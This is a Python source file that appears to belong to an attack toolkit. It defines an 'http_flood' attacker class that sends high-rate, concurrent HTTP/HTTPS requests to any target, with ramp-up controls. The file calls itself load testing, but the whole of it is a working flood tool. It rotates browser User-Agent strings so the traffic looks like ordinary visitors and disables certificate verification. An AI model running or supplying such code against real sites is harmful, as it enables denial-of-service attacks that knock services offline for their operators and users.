import asyncio
import random
import ssl
import time
from collections import defaultdict
from typing import Any, Optional

import aiohttp
import structlog

from attack.base import BaseAttacker
from utils.histogram import Histogram

logger = structlog.get_logger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]


class HTTPFloodAttack(BaseAttacker):
    name = "http_flood"
    description = "HTTP/HTTPS load & stress testing with latency, ramp-up, status tracking"

    async def run(
        self,
        target: str,
        method: str = "GET",
        path: str = "/",
        rate: int = 100,
        concurrent: int = 50,
        max_requests: int = 0,
        body: Optional[str] = None,
        headers: Optional[dict] = None,
        ramp_start: int = 0,
        ramp_end: int = 0,
        ramp_duration: float = 0,
        **kwargs: Any,
    ) -> None:
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"
        if not path.startswith("/"):
            path = f"/{path}"

        url = target.rstrip("/") + path if path != "/" else target.rstrip("/")

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(
            limit=concurrent * 2,
            limit_per_host=concurrent,
            ssl=ssl_context,
            force_close=False,
            enable_cleanup_closed=True,
            ttl_dns_cache=300,
            keepalive_timeout=60,
        )
        timeout = aiohttp.ClientTimeout(total=30, connect=5)

        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        sem = asyncio.Semaphore(concurrent)
        latency_hist = Histogram()
        status_codes: dict[int, int] = defaultdict(int)
        error_types: dict[str, int] = defaultdict(int)

        ramp_enabled = ramp_start > 0 and ramp_end > ramp_start and ramp_duration > 0
        ramp_start_time = time.monotonic()

        def current_ramp() -> int:
            if not ramp_enabled:
                return concurrent
            elapsed = time.monotonic() - ramp_start_time
            if elapsed >= ramp_duration:
                return ramp_end
            frac = elapsed / ramp_duration
            return max(1, int(ramp_start + (ramp_end - ramp_start) * frac))

        async def make_request(client: aiohttp.ClientSession) -> None:
            headers_dict = dict(headers or {})
            headers_dict["User-Agent"] = random.choice(USER_AGENTS)
            if "Accept" not in headers_dict:
                headers_dict["Accept"] = "*/*"

            t0 = time.monotonic()
            try:
                if method.upper() == "GET":
                    resp = await client.get(url, headers=headers_dict)
                elif method.upper() == "POST":
                    resp = await client.post(url, data=body or "", headers=headers_dict)
                elif method.upper() == "HEAD":
                    resp = await client.head(url, headers=headers_dict)
                else:
                    resp = await client.request(method.upper(), url, data=body, headers=headers_dict)

                content = await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                latency_hist.add(elapsed_ms)
                status_codes[resp.status] += 1
                self.session.stats.packets_sent += 1
                self.session.stats.bytes_sent += len(content or b"")
                self.session.stats.packets_received += 1
                self.session.stats.bytes_received += len(content or b"")
            except asyncio.TimeoutError:
                self.session.stats.errors += 1
                error_types["timeout"] += 1
            except aiohttp.ClientConnectorError as e:
                self.session.stats.errors += 1
                error_types[f"conn:{type(e).__name__}"] += 1
            except aiohttp.ClientResponseError as e:
                self.session.stats.errors += 1
                error_types[f"status:{e.status}"] += 1
            except Exception as e:
                self.session.stats.errors += 1
                error_types[f"client:{type(e).__name__}"] += 1

        delay = 1.0 / rate if rate > 0 else 0

        async def worker() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                current_max = current_ramp()
                active = 0
                for w in tasks:
                    if w is not asyncio.current_task() and not w.done():
                        active += 1

                if ramp_enabled and active >= current_max:
                    await asyncio.sleep(0.1)
                    continue

                async with sem:
                    await make_request(session)

                if max_requests > 0 and self.session.stats.packets_sent >= max_requests:
                    self.session.stop()
                    return

                await asyncio.sleep(delay)

        tasks = [asyncio.create_task(worker()) for _ in range(concurrent)]
        self.session._latency_hist = latency_hist
        self.session._status_codes = status_codes
        self.session._error_types = error_types

        try:
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await session.close()
            self.session.stats.status_codes = dict(status_codes)
            self.session.stats.error_types = dict(error_types)
